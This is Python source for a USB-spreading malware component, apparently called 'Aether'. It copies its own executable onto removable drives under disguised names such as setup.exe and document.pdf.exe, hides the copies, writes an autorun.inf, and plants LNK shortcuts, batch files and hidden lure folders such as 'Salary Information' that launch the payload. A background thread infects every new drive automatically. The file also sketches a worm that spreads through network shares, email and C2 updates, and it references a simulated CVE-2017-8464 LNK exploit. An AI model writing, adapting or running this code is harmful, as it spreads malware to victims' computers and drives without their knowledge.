import os, sys, shutil, win32api, win32file, win32con, time, random, hashlib, json
from datetime import datetime
import ctypes, ctypes.wintypes, struct, threading, queue, string
from pathlib import Path

class USBSpread:
    def __init__(self):
        self.usb_log_path = os.path.join(os.environ['TEMP'], 'AetherUSBLog.json')
        self.infected_usbs = self.load_infection_log()
        self.payload_path = self.prepare_payload()
        self.running = False
        self.monitor_thread = None
        
    def load_infection_log(self):
        """Load log of previously infected USBs."""
        try:
            if os.path.exists(self.usb_log_path):
                with open(self.usb_log_path, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {}
    
    def save_infection_log(self):
        """Save infection log to file."""
        try:
            with open(self.usb_log_path, 'w') as f:
                json.dump(self.infected_usbs, f, indent=2)
        except:
            pass
    
    def prepare_payload(self):
        """Prepare the payload for USB spreading."""
        # Current executable is our payload
        current_exe = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
        payload_dir = os.path.join(os.environ['TEMP'], 'AetherUSB')
        os.makedirs(payload_dir, exist_ok=True)
        
        # Create multiple disguised versions
        disguises = [
            ('setup.exe', 'Software Installation'),
            ('document.pdf.exe', 'Document Viewer'),
            ('music_player.exe', 'Media Player'),
            ('game_launcher.exe', 'Game'),
            ('photo_viewer.exe', 'Image Viewer')
        ]
        
        payloads = []
        for filename, description in disguises:
            payload_path = os.path.join(payload_dir, filename)
            
            # Copy and modify if needed
            shutil.copy2(current_exe, payload_path)
            
            # Change icon if possible
            self.set_file_icon(payload_path, description)
            
            # Modify file attributes
            win32file.SetFileAttributes(payload_path, win32con.FILE_ATTRIBUTE_HIDDEN | 
                                      win32con.FILE_ATTRIBUTE_SYSTEM)
            
            payloads.append({
                'path': payload_path,
                'name': filename,
                'description': description,
                'size': os.path.getsize(payload_path)
            })
        
        # Save payload manifest
        manifest_path = os.path.join(payload_dir, 'manifest.json')
        with open(manifest_path, 'w') as f:
            json.dump(payloads, f, indent=2)
        
        return payload_dir
    
    def set_file_icon(self, filepath, description):
        """Attempt to set file icon (requires resource editing)."""
        # This is simplified - real icon setting requires Resource Hacker or similar
        # For now, we'll just note the intention
        pass
    
    def infect_usb(self, drive_letter=None):
        """Infect a USB drive."""
        if not drive_letter:
            # Find first removable drive
            drives = self.get_removable_drives()
            if not drives:
                return {"error": "No removable drives found"}
            drive_letter = drives[0]
        
        drive_path = f"{drive_letter}:\\"
        drive_id = self.get_drive_id(drive_path)
        
        # Check if already infected
        if drive_id in self.infected_usbs:
            return {"already_infected": True, "drive": drive_letter, "id": drive_id}
        
        try:
            infection_result = {
                'drive': drive_letter,
                'id': drive_id,
                'timestamp': datetime.now().isoformat(),
                'methods': []
            }
            
            # Method 1: Autorun.inf
            autorun_result = self.create_autorun_inf(drive_path)
            if autorun_result:
                infection_result['methods'].append('autorun')
                infection_result['autorun'] = autorun_result
            
            # Method 2: LNK file in root
            lnk_result = self.create_lnk_file(drive_path)
            if lnk_result:
                infection_result['methods'].append('lnk')
                infection_result['lnk'] = lnk_result
            
            # Method 3: Hidden folder with enticing name
            folder_result = self.create_hidden_folder(drive_path)
            if folder_result:
                infection_result['methods'].append('hidden_folder')
                infection_result['hidden_folder'] = folder_result
            
            # Method 4: Fake document icons
            document_result = self.create_fake_documents(drive_path)
            if document_result:
                infection_result['methods'].append('fake_documents')
                infection_result['fake_documents'] = document_result
            
            # Method 5: Exploit Windows feature (CVE-2017-8464 LNK vulnerability simulation)
            exploit_result = self.simulate_lnk_exploit(drive_path)
            if exploit_result:
                infection_result['methods'].append('lnk_exploit')
                infection_result['lnk_exploit'] = exploit_result
            
            # Log infection
            self.infected_usbs[drive_id] = infection_result
            self.save_infection_log()
            
            return {
                'success': True,
                'drive': drive_letter,
                'id': drive_id,
                'methods': infection_result['methods'],
                'timestamp': infection_result['timestamp']
            }
            
        except Exception as e:
            return {"error": str(e), "drive": drive_letter}
    
    def get_removable_drives(self):
        """Get list of removable drives."""
        drives = []
        
        # Get logical drives
        drive_types = {
            0: "Unknown",
            1: "No Root",
            2: "Removable",
            3: "Fixed",
            4: "Remote",
            5: "CD-ROM",
            6: "RAM Disk"
        }
        
        for letter in string.ascii_uppercase:
            drive_path = f"{letter}:\\"
            try:
                drive_type = win32file.GetDriveType(drive_path)
                if drive_type == 2:  # DRIVE_REMOVABLE
                    drives.append(letter)
            except:
                pass
        
        return drives
    
    def get_drive_id(self, drive_path):
        """Get unique ID for drive."""
        try:
            volume_info = win32api.GetVolumeInformation(drive_path)
            serial_number = volume_info[1]
            return f"{drive_path}_{serial_number}"
        except:
            return f"{drive_path}_{hashlib.md5(drive_path.encode()).hexdigest()[:8]}"
    
    def create_autorun_inf(self, drive_path):
        """Create autorun.inf file."""
        autorun_content = r'''[AutoRun]
open=setup.exe
icon=setup.exe
action=Open folder to view files
label=USB Drive
shell\open=Open
shell\open\command=setup.exe
shell\explore=Explorer
shell\explore\command=setup.exe
'''
        
        autorun_path = os.path.join(drive_path, 'autorun.inf')
        
        try:
            with open(autorun_path, 'w') as f:
                f.write(autorun_content)
            
            # Set hidden and system attributes
            win32file.SetFileAttributes(autorun_path, win32con.FILE_ATTRIBUTE_HIDDEN | 
                                      win32con.FILE_ATTRIBUTE_SYSTEM)
            
            # Copy payload as setup.exe
            payloads = self.get_payloads()
            if payloads:
                target_exe = os.path.join(drive_path, 'setup.exe')
                shutil.copy2(payloads[0]['path'], target_exe)
                
                # Hide the executable too
                win32file.SetFileAttributes(target_exe, win32con.FILE_ATTRIBUTE_HIDDEN)
            
            return {
                'file': 'autorun.inf',
                'payload': 'setup.exe',
                'hidden': True
            }
            
        except Exception as e:
            return None
    
    def create_lnk_file(self, drive_path):
        """Create LNK shortcut file."""
        try:
            import winshell
            from win32com.client import Dispatch
            
            # Choose a payload
            payloads = self.get_payloads()
            if not payloads:
                return None
            
            payload = random.choice(payloads)
            lnk_name = f"Documents.lnk"
            lnk_path = os.path.join(drive_path, lnk_name)
            
            # Create shortcut
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(lnk_path)
            shortcut.Targetpath = payload['path']
            shortcut.WorkingDirectory = os.path.dirname(payload['path'])
            shortcut.IconLocation = f"{payload['path']},0"
            shortcut.Description = "Open Documents Folder"
            
            # Make it look like a folder
            shortcut.WindowStyle = 1  # Normal window
            
            shortcut.save()
            
            return {
                'name': lnk_name,
                'target': payload['name'],
                'description': 'Folder shortcut (actually executable)'
            }
            
        except:
            # Fallback: create a batch file that runs payload
            batch_content = f'''@echo off
start "" "{payload['path']}"
echo Opening documents...
pause
'''
            
            batch_path = os.path.join(drive_path, 'OpenDocuments.bat')
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            return {
                'name': 'OpenDocuments.bat',
                'type': 'batch file',
                'description': 'Batch file that executes payload'
            }
    
    def create_hidden_folder(self, drive_path):
        """Create hidden folder with enticing contents."""
        folder_name = random.choice([
            'Private Photos',
            'Confidential Documents',
            'Salary Information',
            'Employee Reviews',
            'Tax Documents 2024'
        ])
        
        folder_path = os.path.join(drive_path, folder_name)
        os.makedirs(folder_path, exist_ok=True)
        
        # Create fake document files
        fake_docs = [
            ('Salary_Details.xlsx.lnk', 'Excel spreadsheet'),
            ('Performance_Review.pdf.lnk', 'PDF document'),
            ('Confidential_List.txt.lnk', 'Text file'),
            ('Photos.zip.lnk', 'Archive file')
        ]
        
        created = []
        for filename, description in fake_docs:
            filepath = os.path.join(folder_path, filename)
            
            # Create LNK file pointing to payload
            try:
                import winshell
                from win32com.client import Dispatch
                
                payloads = self.get_payloads()
                if payloads:
                    payload = random.choice(payloads)
                    
                    shell = Dispatch('WScript.Shell')
                    shortcut = shell.CreateShortCut(filepath)
                    shortcut.Targetpath = payload['path']
                    shortcut.IconLocation = self.get_icon_for_extension(filename)
                    shortcut.Description = description
                    shortcut.save()
                    
                    created.append(filename)
            except:
                # Create empty file with enticing name
                with open(filepath, 'w') as f:
                    f.write(f"This appears to be {description}\n")
                    f.write("To view this file, run the viewer application.\n")
        
        # Hide the folder
        try:
            win32file.SetFileAttributes(folder_path, win32con.FILE_ATTRIBUTE_HIDDEN)
        except:
            pass
        
        return {
            'folder': folder_name,
            'files': created,
            'hidden': True
        }
    
    def get_icon_for_extension(self, filename):
        """Get appropriate icon for file extension."""
        icons = {
            '.xlsx': 'excel.exe',
            '.pdf': 'acrord32.exe',
            '.txt': 'notepad.exe',
            '.zip': 'explorer.exe',
            '.docx': 'winword.exe',
            '.jpg': 'photoviewer.dll'
        }
        
        for ext, icon in icons.items():
            if filename.endswith(ext):
                # Try to find the actual executable
                common_paths = [
                    f"C:\\Program Files\\Microsoft Office\\root\\Office16\\{icon}",
                    f"C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\{icon}",
                    f"C:\\Windows\\System32\\{icon}",
                    f"C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\{icon}"
                ]
                
                for path in common_paths:
                    if os.path.exists(path):
                        return f"{path},0"
        
        return "shell32.dll,0"  # Default icon
    
    def create_fake_documents(self, drive_path):
        """Create fake document files that are actually executables."""
        fake_files = []
        
        # Use double extension trick: filename.pdf.exe
        double_extensions = [
            ('Resume.pdf', 'Adobe Acrobat Document'),
            ('Invoice.xlsx', 'Microsoft Excel Worksheet'),
            ('Photo.jpg', 'JPEG Image'),
            ('Song.mp3', 'MP3 Audio File'),
            ('Video.mp4', 'MP4 Video File')
        ]
        
        payloads = self.get_payloads()
        if not payloads:
            return None
        
        for display_name, filetype in double_extensions:
            # Actual filename with .exe extension
            actual_name = f"{display_name}.exe"
            filepath = os.path.join(drive_path, actual_name)
            
            # Copy payload
            payload = random.choice(payloads)
            shutil.copy2(payload['path'], filepath)
            
            # Hide .exe extension by setting file attributes (simplified)
            # In reality, would need to manipulate shell settings or use alternate streams
            
            fake_files.append({
                'display_name': display_name,
                'actual_name': actual_name,
                'type': filetype,
                'size': os.path.getsize(filepath)
            })
        
        return {
            'files': fake_files,
            'technique': 'double_extension'
        }
    
    def simulate_lnk_exploit(self, drive_path):
        """Simulate LNK exploit (CVE-2017-8464)."""
        # This is a simulation - actual exploit requires specific vulnerability
        # Create a malicious LNK file that would trigger the exploit if system is vulnerable
        
        lnk_content = '''This would be a specially crafted LNK file 
that exploits CVE-2017-8464 (Windows LNK Remote Code Execution).

In reality, this would contain:
1. Malicious icon reference pointing to remote SMB share
2. Crafted metadata causing buffer overflow
3. Shell code execution on parse

Since we're simulating, we'll just create a normal LNK file.
'''
        
        lnk_path = os.path.join(drive_path, 'Malicious.lnk')
        with open(lnk_path, 'w') as f:
            f.write(lnk_content)
        
        # Hide it
        win32file.SetFileAttributes(lnk_path, win32con.FILE_ATTRIBUTE_HIDDEN)
        
        return {
            'file': 'Malicious.lnk',
            'cve': 'CVE-2017-8464',
            'simulated': True,
            'description': 'LNK Remote Code Execution exploit simulation'
        }
    
    def get_payloads(self):
        """Get available payloads."""
        manifest_path = os.path.join(self.payload_path, 'manifest.json')
        try:
            with open(manifest_path, 'r') as f:
                return json.load(f)
        except:
            return []
    
    def start_monitor(self):
        """Start monitoring for USB insertion."""
        if self.running:
            return "Already monitoring"
        
        self.running = True
        self.monitor_thread = threading.Thread(target=self.monitor_loop, daemon=True)
        self.monitor_thread.start()
        
        return "USB monitor started"
    
    def monitor_loop(self):
        """Monitor for new USB drives."""
        known_drives = set(self.get_removable_drives())
        
        while self.running:
            try:
                current_drives = set(self.get_removable_drives())
                new_drives = current_drives - known_drives
                
                for drive in new_drives:
                    # New USB inserted
                    print(f"[*] New USB drive detected: {drive}:")
                    
                    # Wait a moment for drive to be ready
                    time.sleep(2)
                    
                    # Infect it
                    result = self.infect_usb(drive)
                    
                    # Log the infection
                    if 'success' in result and result['success']:
                        print(f"[+] USB {drive}: infected successfully")
                    else:
                        print(f"[-] USB {drive}: infection failed")
                
                known_drives = current_drives
                time.sleep(5)  # Check every 5 seconds
                
            except Exception as e:
                time.sleep(10)
    
    def stop_monitor(self):
        """Stop USB monitoring."""
        self.running = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
        
        return "USB monitor stopped"
    
    def get_infection_stats(self):
        """Get statistics on infected USBs."""
        total = len(self.infected_usbs)
        methods_count = {}
        
        for drive_id, info in self.infected_usbs.items():
            for method in info.get('methods', []):
                methods_count[method] = methods_count.get(method, 0) + 1
        
        return {
            'total_infected': total,
            'methods': methods_count,
            'first_infection': min([info.get('timestamp', '') for info in self.infected_usbs.values()]) if total > 0 else None,
            'last_infection': max([info.get('timestamp', '') for info in self.infected_usbs.values()]) if total > 0 else None
        }
    
    def create_propagating_worm(self):
        """Create a self-propagating worm variant."""
        worm_code = '''
# AETHER USB Worm Variant
# Self-propagating through USB and network shares

import os, sys, shutil, win32api, win32file, win32con, time, random, hashlib, json
from datetime import datetime
import ctypes, ctypes.wintypes, struct, threading, queue, string
from pathlib import Path

class AetherWorm:
    def __init__(self):
        self.signature = "AETHER_WORM_v1.0"
        self.generation = 0
        self.parent_id = self.get_machine_id()
        
    def propagate(self):
        # 1. USB propagation
        self.infect_usb_drives()
        
        # 2. Network share propagation
        self.infect_network_shares()
        
        # 3. Email propagation (if credentials available)
        self.propagate_via_email()
        
        # 4. Update itself
        self.self_update()
        
    def infect_usb_drives(self):
        # Same as USBSpread class
        pass
        
    def infect_network_shares(self):
        # Enumerate network shares and copy self
        pass
        
    def propagate_via_email(self):
        # Use harvested contacts to send itself
        pass
        
    def self_update(self):
        # Check for newer versions from C2
        # Update if available
        pass
        
    def get_machine_id(self):
        # Generate unique machine ID
        import uuid, platform
        return hashlib.md5(f"{platform.node()}{uuid.getnode()}".encode()).hexdigest()
'''
        
        # Save worm code
        worm_path = os.path.join(self.payload_path, 'worm_variant.py')
        with open(worm_path, 'w') as f:
            f.write(worm_code)
        
        return {
            'path': worm_path,
            'type': 'self_propagating_worm',
            'signature': 'AETHER_WORM_v1.0',
            'capabilities': ['usb_propagation', 'network_propagation', 'email_propagation', 'self_update']
        }
    
    def clean_infection(self, drive_letter):
        """Clean infection from USB drive."""
        drive_path = f"{drive_letter}:\\"
        drive_id = self.get_drive_id(drive_path)
        
        if drive_id not in self.infected_usbs:
            return {"error": "Drive not found in infection log"}
        
        infection_info = self.infected_usbs[drive_id]
        removed_files = []
        
        try:
            # Remove autorun.inf
            autorun_path = os.path.join(drive_path, 'autorun.inf')
            if os.path.exists(autorun_path):
                os.remove(autorun_path)
                removed_files.append('autorun.inf')
            
            # Remove setup.exe
            setup_path = os.path.join(drive_path, 'setup.exe')
            if os.path.exists(setup_path):
                os.remove(setup_path)
                removed_files.append('setup.exe')
            
            # Remove LNK files
            for root, dirs, files in os.walk(drive_path):
                for file in files:
                    if file.endswith('.lnk'):
                        filepath = os.path.join(root, file)
                        try:
                            os.remove(filepath)
                            removed_files.append(file)
                        except:
                            pass
            
            # Remove hidden folders
            for item in os.listdir(drive_path):
                item_path = os.path.join(drive_path, item)
                if os.path.isdir(item_path):
                    try:
                        attrs = win32file.GetFileAttributes(item_path)
                        if attrs & win32con.FILE_ATTRIBUTE_HIDDEN:
                            shutil.rmtree(item_path)
                            removed_files.append(item)
                    except:
                        pass
            
            # Remove from infection log
            del self.infected_usbs[drive_id]
            self.save_infection_log()
            
            return {
                'success': True,
                'drive': drive_letter,
                'removed_files': removed_files,
                'cleaned': True
            }
            
        except Exception as e:
            return {"error": str(e), "partially_cleaned": removed_files}